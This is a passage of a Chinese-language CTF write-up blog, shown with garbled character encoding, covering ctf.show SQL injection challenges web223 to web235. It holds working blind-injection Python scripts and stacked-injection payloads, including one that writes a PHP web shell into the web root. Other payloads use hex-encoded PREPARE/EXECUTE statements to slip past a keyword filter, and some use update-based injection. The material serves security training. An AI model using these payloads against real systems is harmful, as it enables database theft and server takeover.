</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®åº“-ctfshow_flagas</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="c1"># æŸ¥å­—æ®µ-flagasabc</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="c1"># æŸ¥flag</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagasabc from ctfshow_flagas&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="c1"># &#34;u&#34;: f&#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))&gt;{createNum(mid)},sleep(true),true)&#34;  #æ—¶é—´ç›²æ³¨ ï¼ˆæˆ‘æ²¡è·‘å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">))&gt;</span><span class="si">{</span><span class="n">createNum</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="si">}</span><span class="s2">,username,&#39;a&#39;)&#34;</span> <span class="c1">#å¸ƒå°”ç›²æ³¨</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># try:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="c1">#     r = requests.post(url,params=params,timeout=1)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1">#     tail = mid</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># except Exception as e:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1">#     head = mid + 1</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;userAUTO&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>å¸ƒå°”ç›²æ³¨è¿™ä¹ˆå¿«ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¦æƒ³ä¸å¼€å°è¯•æ—¶é—´ç›²æ³¨å‘¢</p>
<h4 id="web224">web224<a hidden class="anchor" aria-hidden="true" href="#web224">#</a></h4>
<p><img alt="image-20250216153130500" loading="lazy" src="./assets/image-20250216153130500.png"></p>
<p>è¯•äº†è¯•ä¸‡èƒ½å¯†ç ï¼Œå¤±è´¥äº†</p>
<p>è®¿é—®/robots.txt</p>
<p>å‘ç°æœ‰é‡ç½®å¯†ç çš„è·¯ç”±</p>
<p><img alt="image-20250216153239173" loading="lazy" src="./assets/image-20250216153239173.png"></p>
<p>ä¿®æ”¹å¯†ç ä¹‹åç™»å…¥ï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<p><img alt="image-20250216153307127" loading="lazy" src="./assets/image-20250216153307127.png"></p>
<p><a href="https://blog.csdn.net/weixin_48083470/article/details/120608011">ctfshow web224 sql_æ–‡ä»¶ä¸Šä¼ äº§ç”Ÿsqlæ³¨å…¥ è¯¦è§£_sqlæ³¨å…¥æ¼æ´ctfæ–‡ä»¶ä¸Šä¼ -CSDNåšå®¢</a></p>
<p>è¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ çš„sqlæ³¨å…¥é¢˜</p>
<p>å½“æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œåå°ä¼šå°†æ–‡ä»¶åï¼Œæ–‡ä»¶è·¯å¾„ï¼Œæ–‡ä»¶ç±»å‹ï¼ˆæ–‡ä»¶å¤´ï¼‰ç›´æ¥ä¸sqlè¯­å¥è¿›è¡Œæ‹¼æ¥</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å¤´æ”¹å†™æˆæˆ‘ä»¬è¦æ‹¼æ¥çš„sqlè¯­å¥ï¼Œä»è€Œå®ç°æ³¨å…¥</p>
<p>å¦‚å›¾</p>
<p><img alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy" src="./assets/ddeff9345ea8c8859aab77907198ff9a.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>C64File &#34;&#39;);select 0x3c3f3d60746163202f662a603f3e into outfile &#39;/var/www/html/1.php&#39;;--+
</code></pre><p><img alt="image-20250216153811510" loading="lazy" src="./assets/image-20250216153811510.png"></p>
<p><img alt="image-20250216153856343" loading="lazy" src="./assets/image-20250216153856343.png"></p>
<p>æ–°å»ºæ–‡æœ¬ï¼Œå†™å…¥payloadï¼Œæ”¹åä¸º1.binï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œè®¿é—®1.binæ‹¿åˆ°flag</p>
<h4 id="å †å æ³¨å…¥">å †å æ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#å †å æ³¨å…¥">#</a></h4>
<h4 id="web225">web225<a hidden class="anchor" aria-hidden="true" href="#web225">#</a></h4>
<p>æ²¡æœ‰è¿‡æ»¤show</p>
<pre tabindex="0"><code>username=1&#39;;show tables;
</code></pre><p><img alt="image-20250216154601897" loading="lazy" src="./assets/image-20250216154601897.png"></p>
<p>å¯ä»¥ç”¨handlerè¯»</p>
<p>payload:</p>
<pre tabindex="0"><code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;
</code></pre><p><img alt="image-20250216154743625" loading="lazy" src="./assets/image-20250216154743625.png"></p>
<blockquote>
<p>1.<code>handler ctfshow_flag as a open;</code></p>
<p><code>HANDLER</code> è¯­å¥æ˜¯ MySQL ä¸­ç”¨äºç›´æ¥æ“ä½œè¡¨çš„ä¸€ç§ç‰¹æ®Šæ–¹å¼ã€‚æ­¤è¯­å¥çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªåä¸º <code>ctfshow_flag</code> çš„è¡¨ï¼Œå¹¶å°†å…¶åˆ«åä¸º <code>a</code>ã€‚<code>HANDLER</code> è¯­å¥å¯ä»¥ç»•è¿‡ä¸€äº›å¸¸è§„çš„æŸ¥è¯¢æœºåˆ¶ï¼Œç›´æ¥è®¿é—®è¡¨çš„æ•°æ®ï¼Œé€šå¸¸ç”¨äºé«˜æ•ˆåœ°è·å–æ•°æ®ã€‚</p>
<p>2.<code>handler ctfshow_flag as a read first;</code></p>
<p>è¯¥è¯­å¥ç»§ç»­ä½¿ç”¨ <code>HANDLER</code> æ¥æ“ä½œä¹‹å‰æ‰“å¼€çš„ <code>ctfshow_flag</code> è¡¨ï¼ˆåˆ«å <code>a</code>ï¼‰ï¼Œ<code>read first</code> è¡¨ç¤ºè¯»å–è¡¨ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®ã€‚</p></blockquote>
<p>å…¶ä»–æ–¹æ³•</p>
<p><img alt="image-20250216155035890" loading="lazy" src="./assets/image-20250216155035890.png"></p>
<h4 id="web226">web226<a hidden class="anchor" aria-hidden="true" href="#web226">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//åˆ†é¡µæŸ¥è¯¢
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#39;</span><span class="p">,</span><span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>è¿™é“é¢˜æŠŠshowç»™wafæ‰äº†</p>
<p>è¿™é¢˜å¯ä»¥ç”¨é¢„å¤„ç†æ¥æ‰“</p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%7B%22request%5Fid%22%3A%22160652999219721940215459%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=160652999219721940215459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&amp;utm_term=%e5%bc%ba%e7%bd%91%e6%9d%af&amp;spm=1018.2118.3001.4450">SQLæ³¨å…¥][å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨(ä¸‰ç§å§¿åŠ¿)-CSDNåšå®¢</a></p>
<p>æ ¼å¼</p>
<pre tabindex="0"><code>PREPARE name from &#39;[my sql sequece]&#39;;   //é¢„å®šä¹‰SQLè¯­å¥
EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥
</code></pre><p>æˆ‘ä»¬å¯ä»¥å…ˆå°†è¦æ‰§è¡Œçš„è¯­å¥è½¬æ¢æˆ16è¿›åˆ¶åï¼Œä½œä¸ºé¢„å¤„ç†çš„sqlè¯­å¥ä¼ å…¥ï¼Œå¹¶æ‰§è¡Œ</p>
<p>payload</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;
//show tables

username=1&#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;
//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfsh_ow_flagas&#39;

username=1&#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;
//select flagasb from ctfsh_ow_flagas
//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890}
</code></pre><h4 id="web227">web227<a hidden class="anchor" aria-hidden="true" href="#web227">#</a></h4>
<p>è¿™é“é¢˜æ²¡åŠæ³•é€šè¿‡æŸ¥è¡¨æ‹¿åˆ°flag</p>
<p>è¿™é“é¢˜çš„payloadæ˜¯</p>
<pre tabindex="0"><code>1&#39;;call getFlag();
</code></pre><p>å°±æ˜¯æ‰§è¡ŒgetFlagå‡½æ•°æ‹¿åˆ°flag</p>
<p>ä½†é—®é¢˜æ˜¯æˆ‘ä»¬è¦æ€ä¹ˆçŸ¥é“è¿™ä¸ªå‡½æ•°å‘¢</p>
<p>æˆ‘ä»¬éœ€è¦æŸ¥çœ‹MySQLçš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚ä¸‹æ–‡</p>
<p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°_mysql æŸ¥è¯¢function-CSDNåšå®¢</a></p>
<p><img alt="image-20250216161746894" loading="lazy" src="./assets/image-20250216161746894.png"></p>
<pre tabindex="0"><code>SELECT * FROM information_schema.Routines
</code></pre><p>é€šè¿‡é¢„å¤„ç†æ‰§è¡Œ</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines;
</code></pre><p><img alt="image-20250216162150778" loading="lazy" src="./assets/image-20250216162150778.png"></p>
<p>å¯ä»¥çœ‹åˆ°getFlagå‡½æ•°å’Œflag</p>
<h4 id="web228">web228<a hidden class="anchor" aria-hidden="true" href="#web228">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = &#34;select id,username,pass from ctfshow_user where username = &#39;{$username}&#39;;&#34;;
  $bansql = &#34;select char from banlist;&#34;;
      
è¿”å›é€»è¾‘

  //å¸ˆå‚…è¯´å†…å®¹å¤ªå¤šï¼Œå°±å†™å…¥æ•°æ®åº“ä¿å­˜
  if(count($banlist)&gt;0){
    foreach ($banlist as $char) {
      if(preg_match(&#34;/&#34;.$char.&#34;/i&#34;, $username)){
        die(json_encode($ret));
      }
    }
  }
</code></pre><p>åŒweb226</p>
<h4 id="web229">web229<a hidden class="anchor" aria-hidden="true" href="#web229">#</a></h4>
<p>åŒweb226</p>
<h4 id="web230">web230<a hidden class="anchor" aria-hidden="true" href="#web230">#</a></h4>
<p>åŒweb226</p>
<h4 id="updateæ³¨å…¥">updateæ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#updateæ³¨å…¥">#</a></h4>
<p><img alt="image-20250217174244222" loading="lazy" src="./assets/image-20250217174244222.png"></p>
<h4 id="web231">web231<a hidden class="anchor" aria-hidden="true" href="#web231">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤

      
</code></pre><p>çŸ¥é“updateå‡½æ•°çš„ä½œç”¨ä¹‹åå°±å¥½ç†è§£äº†</p>
<p>å¯ä»¥é€šè¿‡updateå‡½æ•°æ›´æ–°ctfshow_userè¡¨ä¸­çš„å†…å®¹</p>
<p>åˆ©ç”¨updateå°†æŸ¥è¯¢ç»“æœå†™å…¥è¡¨ä¸­</p>
<pre tabindex="0"><code>password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
</code></pre><p><img alt="image-20250217180924812" loading="lazy" src="./assets/image-20250217180924812.png"></p>
<pre tabindex="0"><code>æŸ¥è¡¨å
password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
æŸ¥åˆ—å
password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;) where 1=1#&amp;username=1
å¾—åˆ°flag
password=1&#39;,username=(select flagas from flaga) where 1=1#&amp;username=1
                      
åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/solitudi/article/details/110144623
</code></pre><h4 id="web232">web232<a hidden class="anchor" aria-hidden="true" href="#web232">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = &#34;update ctfshow_user set pass = md5(&#39;{$password}&#39;) where username = &#39;{$username}&#39;;&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤
</code></pre><p>åŒweb231</p>
<pre tabindex="0"><code>password=1&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1

password=1&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;) where 1=1#&amp;username=1

password=1&#39;),username=(select flagass from flagaa) where 1=1#&amp;username=1
</code></pre><h4 id="web233">web233<a hidden class="anchor" aria-hidden="true" href="#web233">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤
</code></pre><p>è¿™é“é¢˜è²Œä¼¼wafæ‰äº†å•å¼•å·ï¼Œå¯¼è‡´æ— æ³•æ„é€ é—­åˆï¼Œå‰é¢çš„æ–¹æ³•ç”¨ä¸äº†</p>
<h5 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•ä¸€">#</a></h5>
<p>wpçœ‹åˆ°çš„éªšæ“ä½œ</p>
<p><img alt="image-20250217182218885" loading="lazy" src="./assets/image-20250217182218885.png"></p>
<p>payload</p>
<pre tabindex="0"><code>#è·å–è¡¨å
password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23

#è·å–åˆ—å
password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23

#è·å–æ•°æ®
password=\&amp;username=,username=(select group_concat(flagass233) from flag233333)
</code></pre><h5 id="æ–¹æ³•äºŒ-ç›²æ³¨">æ–¹æ³•äºŒ ï¼šç›²æ³¨<a hidden class="anchor" aria-hidden="true" href="#æ–¹æ³•äºŒ-ç›²æ³¨">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®åº“</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;flag233333&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagass233 from flag233333&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(0.05),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.9</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web234">web234<a hidden class="anchor" aria-hidden="true" href="#web234">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //åˆ†é¡µæŸ¥è¯¢
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
è¿”å›é€»è¾‘

  //æ— è¿‡æ»¤
</code></pre><p>åŒweb233ï¼Œç”¨\å®ç°é€ƒé€¸</p>
<h4 id="web235">web235<a hidden class="anchor" aria-hidden="true" href="#web235">#</a></h4>
